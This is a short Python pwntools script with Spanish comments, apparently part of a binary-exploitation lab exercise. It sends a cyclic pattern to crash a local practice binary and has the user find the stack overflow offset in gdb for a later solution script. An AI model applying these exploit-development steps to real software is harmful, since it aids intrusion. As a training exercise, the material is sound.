#!/usr/bin/env python3
# A2: hallar offset con patron ciclico
from pwn import process, cyclic, context
context.binary = "./bin/a2"
io = process("./bin/a2")
io.sendline(cyclic(200))
io.wait()
# Tras el crash, en gdb:
#   pattern search $rsp
# Anota el offset y usalo en a3_sol.py
print("Envia 200 bytes de patron ciclico. Usa gdb + pattern search $rsp para hallar offset.")
